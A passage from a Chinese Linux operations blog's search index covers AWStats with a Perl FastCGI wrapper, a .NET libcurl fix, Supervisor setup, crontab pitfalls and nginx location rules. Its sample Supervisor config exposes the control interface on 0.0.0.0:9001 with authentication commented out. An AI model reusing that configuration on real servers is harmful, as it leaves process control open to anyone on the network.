$server_addr; fastcgi_param SERVER_PORT $server_port; fastcgi_param SERVER_NAME $server_name; fastcgi_read_timeout 60; [root@00 conf]# cd /application/nginx/sbin/ [root@00 sbin]# vim fcgi #创建fcgi启动文件 #!/usr/bin/perl use FCGI; #perl -MCPAN -e 'install FCGI' use Socket; use POSIX qw(setsid); #use Fcntl; require 'syscall.ph'; \u0026daemonize; #this keeps the program alive or something after exec'ing perl scripts END() { } BEGIN() { } *CORE::GLOBAL::exit = sub { die \"fakeexit\\nrc=\".shift().\"\\n\"; }; eval q{exit}; if ($@) { exit unless $@ =~ /^fakeexit/; }; \u0026main; sub daemonize() { chdir '/' or die \"Can't chdir to /: $!\"; defined(my $pid = fork) or die \"Can't fork: $!\"; exit if $pid; setsid or die \"Can't start a new session: $!\"; umask 0; } sub main { #$socket = FCGI::OpenSocket( \"127.0.0.1:8999\", 10 ); $socket = FCGI::OpenSocket( \"/data/nginx/fastcgi_temp/perl_cgi-dispatch.sock\", 10 ); #这个改成自己的目录 #use UNIX sockets - user running this script must have w access to the 'nginx' folder!! $request = FCGI::Request( \\*STDIN, \\*STDOUT, \\*STDERR, \\%req_params, $socket ); if ($request) { request_loop()}; FCGI::CloseSocket( $socket ); } sub request_loop { while( $request-\u003eAccept() \u003e= 0 ) { #processing any STDIN input from WebServer (for CGI-POST actions) $stdin_passthrough =''; $req_len = 0 + $req_params{'CONTENT_LENGTH'}; if (($req_params{'REQUEST_METHOD'} eq 'POST') \u0026\u0026 ($req_len != 0) ){ my $bytes_read = 0; while ($bytes_read \u003c $req_len) { my $data = ''; my $bytes = read(STDIN, $data, ($req_len - $bytes_read)); last if ($bytes == 0 || !defined($bytes)); $stdin_passthrough .= $data; $bytes_read += $bytes; } } #running the cgi app if ( (-x $req_params{SCRIPT_FILENAME}) \u0026\u0026 #can I execute this? (-s $req_params{SCRIPT_FILENAME}) \u0026\u0026 #Is this file empty? (-r $req_params{SCRIPT_FILENAME}) #can I read this file? ){ pipe(CHILD_RD, PARENT_WR); my $pid = open(KID_TO_READ, \"-|\"); unless(defined($pid)) { print(\"Content-type: text/plain\\r\\n\\r\\n\"); print \"Error: CGI app returned no output - Executing $req_params {SCRIPT_FILENAME} failed !\\n\"; next; } if ($pid \u003e 0) { close(CHILD_RD); print PARENT_WR $stdin_passthrough; close(PARENT_WR); while(my $s = \u003cKID_TO_READ\u003e) { print $s; } close KID_TO_READ; waitpid($pid, 0); } else { forea","date":"2019-02-21","objectID":"/posts/linux/awstats%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E7%B3%BB%E7%BB%9F/:3:0","tags":["linux","日志","awstats"],"title":"Awstats日志分析系统","uri":"/posts/linux/awstats%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E7%B3%BB%E7%BB%9F/"},{"categories":["linux","运维记事"],"content":"4. 测试,启动 [root@00 sbin]# /data/nginx/sbin/fcgi #启动fcgi [root@00 sbin]# /data/nginx/sbin/nginx #启动nginx ## 单条更新时候需要修改/etc/awstats/awstats.xxx.conf配置文件中LogFile的参数,将其改成固定要导入的那天就可以了,如果以前有导入过数据,现在需要导入更之前的数据,需要更改配置文件中的DirData参数配置的路径下的txt文件,修改里面的LastLine 20170714230501 100542 25372721 0,将里面的日期改成要导入数据的前一天. [root@00 sbin]# /data/awstats/wwwroot/cgi-bin/awstats.pl -update -config=example.com #单条更新站点数据-config后面的就是上面配置的参数;还有个批量更新的，这个没有记录 ## http://xxxxxxxxx:33333/cgi-bin/awstats.pl?config=example.com #动态页面访问地址 [root@00 sbin]# /data/awstats/tools/awstats_buildstaticpages.pl -update -config=example.com -lang=cn -dir=/data/awstats -awstatsprog=/data/awstats/wwwroot/cgi-bin/awstats.pl #这个是生成静态数据页面的,生成静态数据页面 ## http://xxxxxxxxxx:8088/awstats.example.com.html #静态页面访问 ","date":"2019-02-21","objectID":"/posts/linux/awstats%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E7%B3%BB%E7%BB%9F/:4:0","tags":["linux","日志","awstats"],"title":"Awstats日志分析系统","uri":"/posts/linux/awstats%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E7%B3%BB%E7%BB%9F/"},{"categories":["linux","运维记事"],"content":"Dotnet运维故障记录","date":"2019-02-21","objectID":"/posts/linux/dotnet%E8%BF%90%E7%BB%B4%E6%95%85%E9%9A%9C%E8%AE%B0%E5%BD%95/","tags":["linux","dotnet","解决方案"],"title":"Dotnet运维故障记录","uri":"/posts/linux/dotnet%E8%BF%90%E7%BB%B4%E6%95%85%E9%9A%9C%E8%AE%B0%E5%BD%95/"},{"categories":["linux","运维记事"],"content":"安装故障 Failed to load , error: libunwind.so.8: cannot open shared object file: No such file or directory Failed to bind to CoreCLR at ‘/root/dotnet/shared/Microsoft.NETCore.App/2.0.0/libcoreclr.so‘ yum install libunwind -y FailFast: Couldn‘t find a valid ICU package installed on the system. Set the configuration flag System.Globalization.Invariant to true if you want to run with no globalization support. yum install icu -y ","date":"2019-02-21","objectID":"/posts/linux/dotnet%E8%BF%90%E7%BB%B4%E6%95%85%E9%9A%9C%E8%AE%B0%E5%BD%95/:1:0","tags":["linux","dotnet","解决方案"],"title":"Dotnet运维故障记录","uri":"/posts/linux/dotnet%E8%BF%90%E7%BB%B4%E6%95%85%E9%9A%9C%E8%AE%B0%E5%BD%95/"},{"categories":["linux","运维记事"],"content":"程序异常 ","date":"2019-02-21","objectID":"/posts/linux/dotnet%E8%BF%90%E7%BB%B4%E6%95%85%E9%9A%9C%E8%AE%B0%E5%BD%95/:2:0","tags":["linux","dotnet","解决方案"],"title":"Dotnet运维故障记录","uri":"/posts/linux/dotnet%E8%BF%90%E7%BB%B4%E6%95%85%E9%9A%9C%E8%AE%B0%E5%BD%95/"},{"categories":["linux","运维记事"],"content":"报错信息 The handler does not support custom handling of certificates with this combination of libcurl (7.29.0) and its SSL backend (\"NSS/3.28.4\") 最近接收到了开发反馈dotnet程序发送短信异常，据说也是一直都有的问题，协助查询了多方资料，发现是libcurl版本的问题，由于服务器上存在了多个dotnet站点，也不敢轻易去升级，后来又听说所有的dotnet都存在，于是对curl进行了一次升级，重启dotnet短信正常 接入一个写的比较清晰的文章 https://blog.azpro.cn/index.php/archives/113/ 升级过程 : # yum install libcurl-openssl -y # wget https://curl.haxx.se/download/curl-7.64.0.tar.gz # tar -xzvf curl-7.64.0.tar.gz # cd curl-7.64.0/ # ./configure --prefix=/opt/curl-7.64.0 --with-ssl # make \u0026\u0026 make install # mv /usr/bin/curl /usr/bin/curl.old # mv /usr/bin/curl-config /usr/bin/curl-config.old # ln -s /opt/curl-7.64.0/ /opt/curl # ln -s /opt/curl/bin/curl /usr/bin/curl # ln -s /opt/curl/bin/curl-config /usr/bin/curl-config # echo \"/opt/curl/lib\" \u003e\u003e /etc/ld.so.conf.d/curl-x86_64.conf # ldconfig ","date":"2019-02-21","objectID":"/posts/linux/dotnet%E8%BF%90%E7%BB%B4%E6%95%85%E9%9A%9C%E8%AE%B0%E5%BD%95/:3:0","tags":["linux","dotnet","解决方案"],"title":"Dotnet运维故障记录","uri":"/posts/linux/dotnet%E8%BF%90%E7%BB%B4%E6%95%85%E9%9A%9C%E8%AE%B0%E5%BD%95/"},{"categories":["linux","运维记事"],"content":"Supervisor批量进程管理","date":"2019-02-21","objectID":"/posts/linux/supervisor%E6%89%B9%E9%87%8F%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86/","tags":["linux"],"title":"Supervisor批量进程管理","uri":"/posts/linux/supervisor%E6%89%B9%E9%87%8F%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86/"},{"categories":["linux","运维记事"],"content":"supervisor 一个简单的python编写的进程管理器，功能类似是将普通进程以守护进程的形式运行到后台 supervisord-monitor 一个集中的管理前端 https://github.com/mlazarov/supervisord-monitor ","date":"2019-02-21","objectID":"/posts/linux/supervisor%E6%89%B9%E9%87%8F%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86/:0:0","tags":["linux"],"title":"Supervisor批量进程管理","uri":"/posts/linux/supervisor%E6%89%B9%E9%87%8F%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86/"},{"categories":["linux","运维记事"],"content":"1. 安装 $\u003e pip3 install supervisor ","date":"2019-02-21","objectID":"/posts/linux/supervisor%E6%89%B9%E9%87%8F%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86/:1:0","tags":["linux"],"title":"Supervisor批量进程管理","uri":"/posts/linux/supervisor%E6%89%B9%E9%87%8F%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86/"},{"categories":["linux","运维记事"],"content":"配置及启动 # 生成配置文件 $\u003e echo_supervisord_conf \u003e /etc/supervisord.conf # 创建systemd 管理脚本 $\u003e vim /etc/systemd/system/supervisord.service [Unit] Description=Process Monitoring and Control Daemon After=rc-local.service [Service] Type=forking ExecStart=/usr/bin/supervisord -c /etc/supervisord.conf LimitCORE=infinity LimitNOFILE=65535 LimitNPROC=65535 [Install] WantedBy=multi-user.target # # # $\u003e systemctl daemon-reload $\u003e systemctl start supervisord # # supervisorctl status：查看所有进程的状态 # supervisorctl stop es：停止es # supervisorctl start es：启动es # supervisorctl restart es: 重启es # supervisorctl update :配置文件修改后可以使用该命令加载新的配置 # supervisorctl reload: 重新启动配置中的所有程序 ","date":"2019-02-21","objectID":"/posts/linux/supervisor%E6%89%B9%E9%87%8F%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86/:2:0","tags":["linux"],"title":"Supervisor批量进程管理","uri":"/posts/linux/supervisor%E6%89%B9%E9%87%8F%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86/"},{"categories":["linux","运维记事"],"content":"3. 配置文件说明 # 注意安装的版本，版本不一样配置文件有差异,以下配置文件是3.1.4 [unix_http_server] file=/tmp/supervisor.sock ; the path to the socket file [inet_http_server] ; inet (TCP) server disabled by default port=0.0.0.0:9001 ; username=\u003cusername\u003e ; password=\u003cpassword\u003e [supervisord] logfile=/tmp/supervisord.log logfile_maxbytes=50MB logfile_backups=10 loglevel=info pidfile=/tmp/supervisord.pid nodaemon=false silent=false minfds=1024 ; 这个是最少系统空闲的文件描述符，低于这个值supervisor将不会启动; default 1024 minprocs=200 ; 最小可用的进程描述符，低于这个值supervisor也将不会正常启动;default 200 ;directory=/tmp ; default is not to cd during start ;nocleanup=false ; 为false时，启动会清除历史的子进程日志; default false ;childlogdir=/tmp ; 'AUTO' child log dir, default $TEMP(python -c \"import tempfile;print tempfile.gettempdir()\") environment=TZ=Asia/Shanghai ; environment=TZ=Asia/Shanghai,TZ=Asia/Shanghai, [rpcinterface:supervisor] supervisor.rpcinterface_factory = supervisor.rpcinterface:make_main_rpcinterface [supervisorctl] serverurl=unix:///tmp/supervisor.sock ; use a unix:// URL for a unix socket ; [program:theprogramname] ; command=/bin/cat ; directory=/tmp ; ; process_name=example.com(80) ; autostart=true ; 是否在 supervisord 启动时启动 ; autorestart=true ; 子进程挂掉时候自动重启 ; user=www ; stopasgroup=true ; killasgroup=true ; redirect_stderr=true ; stdout_logfile=/var/log/example.com.log ; stdout_logfile_maxbytes=50MB ; stdout_logfile_backups=10 ; ; environment=TZ=Asia/Shanghai ; ; exitcodes=CODE1,CODE2 ; 允许的进程退出码。以\",\"分隔，默认为0,2。 [include] files = /etc/supervisord.d/*.ini ","date":"2019-02-21","objectID":"/posts/linux/supervisor%E6%89%B9%E9%87%8F%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86/:3:0","tags":["linux"],"title":"Supervisor批量进程管理","uri":"/posts/linux/supervisor%E6%89%B9%E9%87%8F%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86/"},{"categories":["linux","运维记事"],"content":"3.1. 配置参数说明 https://blog.csdn.net/lvmuheng/article/details/72367849 [unix_http_server] file=/tmp/supervisor.sock ; socket文件的路径，supervisorctl用XML_RPC和supervisord通信就是通过它进行 的。如果不设置的话，supervisorctl也就不能用了 不设置的话，默认为none。 非必须设置 ;chmod=0700 ; 这个简单，就是修改上面的那个socket文件的权限为0700 不设置的话，默认为0700。 非必须设置 ;chown=nobody:nogroup ; 这个一样，修改上面的那个socket文件的属组为user.group 不设置的话，默认为启动supervisord进程的用户及属组。非必须设置 ;username=user ; 使用supervisorctl连接的时候，认证的用户 不设置的话，默认为不需要用户。 非必须设置 ;password=123 ; 和上面的用户名对应的密码，可以直接使用明码，也可以使用SHA加密 如：{SHA}82ab876d1387bfafe46cc1c8a2ef074eae50cb1d 默认不设置。。。非必须设置 ;[inet_http_server] ; 侦听在TCP上的socket，Web Server和远程的supervisorctl都要用到他 不设置的话，默认为不开启。非必须设置 ;port=127.0.0.1:9001 ; 这个是侦听的IP和端口，侦听所有IP用 :9001或*:9001。 这个必须设置，只要上面的[inet_http_server]开启了，就必须设置它 ;username=user ; 这个和上面的uinx_http_server一个样。非必须设置 ;password=123 ; 这个也一个样。非必须设置 [supervisord] ;这个主要是定义supervisord这个服务端进程的一些参数的 这个必须设置，不设置，supervisor就不用干活了 logfile=/tmp/supervisord.log ; 这个是supervisord这个主进程的日志路径，注意和子进程的日志不搭嘎。 默认路径$CWD/supervisord.log，$CWD是当前目录。。非必须设置 logfile_maxbytes=50MB ; 这个是上面那个日志文件的最大的大小，当超过50M的时候，会生成一个新的日 志文件。当设置为0时，表示不限制文件大小 默认值是50M，非必须设置。 logfile_backups=10 ; 日志文件保持的数量，上面的日志文件大于50M时，就会生成一个新文件。文件 数量大于10时，最初的老文件被新文件覆盖，文件数量将保持为10 当设置为0时，表示不限制文件的数量。 默认情况下为10。。。非必须设置 loglevel=info ; 日志级别，有critical, error, warn, info, debug, trace, or blather等 默认为info。。。非必须设置项 pidfile=/tmp/supervisord.pid ; supervisord的pid文件路径。 默认为$CWD/supervisord.pid。。。非必须设置 nodaemon=false ; 如果是true，supervisord进程将在前台运行 默认为false，也就是后台以守护进程运行。。。非必须设置 minfds=1024 ; 这个是最少系统空闲的文件描述符，低于这个值supervisor将不会启动。 系统的文件描述符在这里设置cat /proc/sys/fs/file-max 默认情况下为1024。。。非必须设置 minprocs=200 ; 最小可用的进程描述符，低于这个值supervisor也将不会正常启动。 ulimit -u这个命令，可以查看linux下面用户的最大进程数 默认为200。。。非必须设置 ;umask=022 ; 进程创建文件的掩码 默认为022。。非必须设置项 ;user=chrism ; 这个参数可以设置一个非root用户，当我们以root用户启动supervisord之后。 我这里面设置的这个用户，也可以对supervisord进行管理 默认情况是不设置。。。非必须设置项 ;identifier=supervisor ; 这个参数是supervisord的标识符，主要是给XML_RPC用的。当你有多个 supervisor的时候，而且想调用XML_RPC统一管理，就需要为每个 supervisor设置不同的标识符了 默认是supervisord。。。非必需设置 ;directory=/tmp ; 这个参数是当supervisord作为守护进程运行的时候，设置这个参数的话，启动 supervisord进程之前，会先切换到这个目录 默认不设置。。。非必须设置 ;nocleanup=true ; 这个参数当为false的时候，会在supervisord进程启动的时候，把以前子进程 产生的日志文件(路径为AUTO的情况下)清除掉。有时候咱们想要看历史日志，当 然不想日志被清除了。所以可以设置为true 默认是false，有调试需求的同学可以设置为true。。。非必须设置 ;childlogdir=/tmp ; 当子进程日志路径为AUTO的时候，子进程日志文件的存放路径。 默认路径是这个东西，执行下面的这个命令看看就OK了，处理的东西就默认路径 python -c \"import tempfile;print tempfile.gettempdir()\" 非必须设置 ;environment=KEY=\"value\" ; 这个是用来设置环境变量的，supervisord在linux中启动默认继承了linux的 环境变量，在这里可以设置supervisord进程特有的其他环境变量。 supervisord启动子进程时，子进程会拷贝父进程的内存空间内容。 所以设置的 这些环境变量也会被子进程继承。 小例子：environment=name=\"haha\",age=\"hehe\" 默认为不设置。。。非必须设置 ;strip_ansi=false ; 这个选项如果设置为true，会清除子进程日志中的所有ANSI 序列。什么是ANSI 序列呢？就是我们的\\n,\\t这些东西。 默认为false。。。非必须设置 ; the below section must remain in the config file for RPC ; (supervisorctl/web interface) to work, additional interfaces may be ; added by defining them in separate rpcinterface: sections [rpcinterface:supervisor] ;这个选项是给XML_RPC用的，当然你如果想使用supervisord或者web server 这 个选项必须要开启的 supervisor.rpcinterface_factory = supervisor.rpcinterface:make_main_rpcinterface [supervisorctl] ;这个主要是针对supervisorctl的一些配置 serverurl=unix:///tmp/supervisor.sock ; 这个是supervisorctl本地连接supervisord的时候，本地UNIX socket 路径，注意这个是和前面的[unix_http_server]对应的 默认值就是unix:///tmp/supervisor.sock。。非必须设置 ;serverurl=http://127.0.0.1:9001 ; 这个是supervisorctl远程连接supervisord的时候，用到的TCP socket路径 注意这个和前面的[inet_http_server]对应 默认就是http://127.0.0.1:9001。。。非必须项 ;username=chris ; 用户名 默认空。。非必须设置 ;password=123 ; 密码 默认空。。非必须设置 ;prompt=mysupervisor ; 输入用户名密码时候的提示符 默认supervisor。。非必须设置 ;history_file=~/.sc_history ; 这个参数和shell中的history类似，我们可以用上下键来查找前面执行过的命令 默认是no file的。。所以我们想要有这种功能，必须指定一个文件。。。非 必须设置 ; The below sample program section shows all possible program subsection values, ; create one or more 'real' program: sections to be able to control them under ; supervisor. ;[program:theprogramname] ;这个就是咱们要管理的子进程了，\":\"后面的是名字，最好别乱写和实际进程 有点关联最好。这样的program我们可以设置一个或多个，一个program就是 要被管理的一个进程 ;command=/bin/cat ; 这个就是我们的要启动进程的命令路径了，可以带参数 例子：","date":"2019-02-21","objectID":"/posts/linux/supervisor%E6%89%B9%E9%87%8F%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86/:4:0","tags":["linux"],"title":"Supervisor批量进程管理","uri":"/posts/linux/supervisor%E6%89%B9%E9%87%8F%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86/"},{"categories":["linux","那些有用没用的"],"content":"那些有用没用的问题收集","date":"2019-02-21","objectID":"/posts/other/%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98%E6%94%B6%E9%9B%86/","tags":["linux","解决方案"],"title":"那些有用没用的问题收集","uri":"/posts/other/%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98%E6%94%B6%E9%9B%86/"},{"categories":["linux","那些有用没用的"],"content":"1. 计划任务配置中/etc/crontab和crontab -e的区别 https://blog.csdn.net/qq_36937234/article/details/80558871 ","date":"2019-02-21","objectID":"/posts/other/%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98%E6%94%B6%E9%9B%86/:1:0","tags":["linux","解决方案"],"title":"那些有用没用的问题收集","uri":"/posts/other/%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98%E6%94%B6%E9%9B%86/"},{"categories":["linux","那些有用没用的"],"content":"1.1. 二者差异 级别差异 /etc/crontab是系统级别的crontab，系统的设置 crontab -e是用户级的crontab linux下实际保存在/var/spool/cron/username中 有些系统设置即使用root账号crontab -e也不行，必须放到/etc/crontab中 语法区别 /etc/crontab 有用户字段 */5 * * * * root /root/scripts/refresh.sh \u003e/dev/null 2\u003e\u00261 crontab -e中不能设置用户字段 1 * */1 * * /bin/sh /root/scripts/refresh.sh \u003e /dev/nul 2\u003e\u00261 ","date":"2019-02-21","objectID":"/posts/other/%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98%E6%94%B6%E9%9B%86/:2:0","tags":["linux","解决方案"],"title":"那些有用没用的问题收集","uri":"/posts/other/%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98%E6%94%B6%E9%9B%86/"},{"categories":["linux","那些有用没用的"],"content":"1.2. 注意点 /var/spool/clientmqueue目录过大，占用磁盘满了 原因：/var/spool/clientmqueue是如果系统中有用户开启了cron，而cron中执行的程序有输出内容，输出内容会以邮件形式发给cron的用户，而sendmail没有启动所以就产生了这些文件 解决：将输出重定向，如\u003e /dev/null 2\u003e\u00261，补充：错误输出也要重定向 /etc/crontab的读写权限 不要随意改动这个文件的读写权限，这个文件应该设置成644或者600，否则会报(system) BAD　FILE MODE (/etc/crontab ) 手动能够执行，但是crontab脚本里面不执行 解决：检查下crontab的环境变量 ： HELL=/bin/bash PATH=/sbin:/bin:/usr/sbin:/usr/bin MAILTO=root HOME=/ ","date":"2019-02-21","objectID":"/posts/other/%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98%E6%94%B6%E9%9B%86/:3:0","tags":["linux","解决方案"],"title":"那些有用没用的问题收集","uri":"/posts/other/%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98%E6%94%B6%E9%9B%86/"},{"categories":["linux","那些有用没用的"],"content":"2. CentOS 7.x 设置开机启动项报错，或软连接报 Too many levels of symbolic links 这个问题报错原因其实已经说明得很明显了，实际上就是在同一个地方创建了同样名字的多个软连接，之所以记录是应为网上鬼扯了一些毫无关联解决方案，可能也存在那样的问题，这儿遇见的是在设置开机启动项systemctl enable的时候报的错，检查了下发现，systemctl enable设置的目录确实是已经存在了一个同名的了，把原来的那个删掉或者改个名字，在创建正常 ","date":"2019-02-21","objectID":"/posts/other/%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98%E6%94%B6%E9%9B%86/:4:0","tags":["linux","解决方案"],"title":"那些有用没用的问题收集","uri":"/posts/other/%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98%E6%94%B6%E9%9B%86/"},{"categories":["linux","那些有用没用的"],"content":"3. HTTP 响应码分类 https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status ","date":"2019-02-21","objectID":"/posts/other/%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98%E6%94%B6%E9%9B%86/:5:0","tags":["linux","解决方案"],"title":"那些有用没用的问题收集","uri":"/posts/other/%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98%E6%94%B6%E9%9B%86/"},{"categories":["linux","那些有用没用的"],"content":"4. Git 和 SVN的区别 git是分布式的，svn是集中式的 git存储数据是以元数据形式存储，svn是按文件，原数据怎样的结构，存储就是怎样的结构 分支不同，svn的分支就是复制了一个目录出来 ","date":"2019-02-21","objectID":"/posts/other/%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98%E6%94%B6%E9%9B%86/:6:0","tags":["linux","解决方案"],"title":"那些有用没用的问题收集","uri":"/posts/other/%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98%E6%94%B6%E9%9B%86/"},{"categories":["linux","运维记事"],"content":"Nginx Location","date":"2019-02-04","objectID":"/posts/linux/nginx-location/","tags":["linux","nginx"],"title":"Nginx Location 模块介绍","uri":"/posts/linux/nginx-location/"},{"categories":["linux","运维记事"],"content":"1. 前言 个人整理,可参考 ","date":"2019-02-04","objectID":"/posts/linux/nginx-location/:1:0","tags":["linux","nginx"],"title":"Nginx Location 模块介绍","uri":"/posts/linux/nginx-location/"},{"categories":["linux","运维记事"],"content":"2. 优化 ","date":"2019-02-04","objectID":"/posts/linux/nginx-location/:2:0","tags":["linux","nginx"],"title":"Nginx Location 模块介绍","uri":"/posts/linux/nginx-location/"},{"categories":["linux","运维记事"],"content":"2.1. 参数说明 worker_processes : 进程数 worker_connections : 最大连接数 (最大并发连接=进程数x最大连接数) autoindex : 当主页不存在的时候，显示目录结构 ","date":"2019-02-04","objectID":"/posts/linux/nginx-location/:3:0","tags":["linux","nginx"],"title":"Nginx Location 模块介绍","uri":"/posts/linux/nginx-location/"},{"categories":["linux","运维记事"],"content":"2.2. nginx 状态说明 配置方法: server { listen port; server_name status.example.com; location / { stub_status on; access_log off; allow 10.0.0.0/24; deny all; } } Active connections : 单位时间内服务器正在处理的连接数 server : 此启动到现在一共处理的连接 accepts : 从启动到现在成功创建多少次握手(和server相同表示没有失败) handled requests : 已经处理完毕的请求数 Reading: : nginx 读取到客户端的header信息数 Writing : 返回给客户端的header信息数 Waiting : 已经处理完等待下一次请求制定的驻留数(在开启keep-alive时，该值等于active-(reading+writing)) ","date":"2019-02-04","objectID":"/posts/linux/nginx-location/:4:0","tags":["linux","nginx"],"title":"Nginx Location 模块介绍","uri":"/posts/linux/nginx-location/"},{"categories":["linux","运维记事"],"content":"2.3. nginx 日志 日志语法(配置于http标签内): log_format name string …; 日志参数说明: $remote_addr : 访问网站的客户端地址 $remote_user : 访问网站的客户端名称 $time_local : 访问网站的时间和时区 $request : 用户的http请求起始行信息(GET/HTTP/1.1) $status : 返回的http状态码 $body_bytes_sent : 服务器发送给客户端的想要body字节 $http_referer : 记录是从那个链接请求访问过来的，可以根据referer进行设置防盗链 $http_user_agent : 记录访问网站的访问信息，比如浏览器、手机客户端等 $http_x_forwarded_for ： 有代理服务器的时候， 设置web节点记录客户端的地址，此参数生效需在代理服务器设置x_forwarded_for ","date":"2019-02-04","objectID":"/posts/linux/nginx-location/:5:0","tags":["linux","nginx"],"title":"Nginx Location 模块介绍","uri":"/posts/linux/nginx-location/"},{"categories":["linux","运维记事"],"content":"2.4. nginx location ","date":"2019-02-04","objectID":"/posts/linux/nginx-location/:6:0","tags":["linux","nginx"],"title":"Nginx Location 模块介绍","uri":"/posts/linux/nginx-location/"},{"categories":["linux","运维记事"],"content":"2.4.1. location 作用 根据用户请求的URI来执行不同的应用。 uri 只可意会，不可言传的东西 ","date":"2019-02-04","objectID":"/posts/linux/nginx-location/:6:1","tags":["linux","nginx"],"title":"Nginx Location 模块介绍","uri":"/posts/linux/nginx-location/"},{"categories":["linux","运维记事"],"content":"2.4.2. location 语法: location [=|~|~*|^~] uri { ... } 说明: location : 指令 [=|~|~*|^~] ：匹配标识 = : 精确匹配 ~ : 用于区分大小写的匹配 ~* : 用于不区分大小写的匹配 ^~ : 常规匹配，不做正则验证 ! : 取反,如:!~*… uri : 匹配的网址 {...} : 匹配uri后要执行的配置段 示例: location = / { [ configuration A] } location / { [ configuration B] } location /documents/ { [ configuration C] } location ^~ /images/ { [ configuration D] } location ~* \\.(gif|jpg|jpeg)$ { [ configuration E] } 不同URI对应的配置: 用户请求的URI 完整的URL地址 匹配的配置 / http://www.example.com/ configuration A /index.html http://www.example.com/ configuration B /documents/index.html http://www.example.com/documents/index.html configuration C /images/1.jpg http://www.example.com/images/1.jpg configuration D /ducoments/1.jpg http://www.example.com/documents/1.jpg configuration E ","date":"2019-02-04","objectID":"/posts/linux/nginx-location/:6:2","tags":["linux","nginx"],"title":"Nginx Location 模块介绍","uri":"/posts/linux/nginx-location/"},{"categories":["linux","运维记事"],"content":"2.4.3 location 语法测试: location / { return 401; } location =/ { return 402; } location /documents/ { return 403; } location ^~ /images/ { return 404; } location ~* \\.(gif|jpg|jpeg)$ { return 500; } 请求结果: [root@00 ~]# curl -s -o /dev/null -I -w \"%{http_code}\\n\" http://www.example.com 402 [root@00 ~]# curl -s -o /dev/null -I -w \"%{http_code}\\n\" http://www.example.com/ 402 [root@00 ~]# curl -s -o /dev/null -I -w \"%{http_code}\\n\" http://www.example.com/index.html 401 [root@00 ~]# curl -s -o /dev/null -I -w \"%{http_code}\\n\" http://www.example.com/documents/index.html 403 [root@00 ~]# curl -s -o /dev/null -I -w \"%{http_code}\\n\" http://www.example.com/images/1.jpg 404 [root@00 ~]# curl -s -o /dev/null -I -w \"%{http_code}\\n\" http://www.example.com/documents/1.jpg 匹配优先级: 不用URI及特殊字符组合匹配顺序 匹配说明 location = / { 精确匹配/ location ^~ /images/ { 匹配常规字符串，不做正则匹配检查 location ~ \\.(gif|JPG|jpeg)$ { 区分大小写的正则匹配 location ~* \\.(gif|jpg|jpeg)$ { 不区分大小写的正则匹配 location /document/ { 匹配常规字符串，如果有正则则优先匹配正则 location / { 所有location都不匹配后的默认匹配规则 注: 优先级为： = \u003e 完整路径 \u003e ^~ \u003e ~|~* \u003e 部分起始路径 \u003e / ","date":"2019-02-04","objectID":"/posts/linux/nginx-location/:6:3","tags":["linux","nginx"],"title":"Nginx Location 模块介绍","uri":"/posts/linux/nginx-location/"},{"categories":["linux","运维记事"],"content":"2.5. nginx Rewrite 用于实现伪静态，URL改写，必须安装PCRE的软件的支持，nginx编译默认安装Rewrite模块 ","date":"2019-02-04","objectID":"/posts/linux/nginx-location/:7:0","tags":["linux","nginx"],"title":"Nginx Location 模块介绍","uri":"/posts/linux/nginx-location/"},{"categories":["linux","运维记事"],"content":"2.5.1. Rewrite 全局变量 - - $remote_addr 获取客户端ip $binary_remote_addr 客户端ip（二进制) $remote_port 客户端port，如：50472 $remote_user 已经经过Auth Basic Module验证的用户名 $host 请求主机头字段，否则为服务器名称，如:blog.sakmon.com $request 用户请求信息，如：GET ?a=1\u0026b=2 HTTP/1.1 $request_filename 当前请求的文件的路径名，由root或alias和URI request组合而成，如：/2013/81.html $status 请求的响应状态码,如:200 $body_bytes_sent 响应时送出的body字节数数量。即使连接中断，这个数据也是精确的,如：40 $content_length 等于请求行的“Content_Length”的值 $content_type 等于请求行的“Content_Type”的值 $http_referer 引用地址 $http_user_agent 客户端agent信息,如：Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.76 Safari/537.36 $args 与$query_string相同 等于当中URL的参数(GET)，如a=1\u0026b=2 $document_uri 与$uri相同 这个变量指当前的请求URI，不包括任何参数(见$args) 如:/2013/81.html $document_root 针对当前请求的根路径设置值 $hostname 如：centos53.localdomain $http_cookie 客户端cookie信息 $cookie_COOKIE cookie COOKIE变量的值 $is_args 如果有$args参数，这个变量等于”?”，否则等于”\"，空值，如? $limit_rate 这个变量可以限制连接速率，0表示不限速 $query_string 与$args相同 等于当中URL的参数(GET)，如a=1\u0026b=2 $request_body 记录POST过来的数据信息 $request_body_file 客户端请求主体信息的临时文件名 $request_method 客户端请求的动作，通常为GET或POST,如：GET $request_uri 包含请求参数的原始URI，不包含主机名，如：/2013/81.html?a=1\u0026b=2 $scheme HTTP方法（如http，https）,如：http $uri 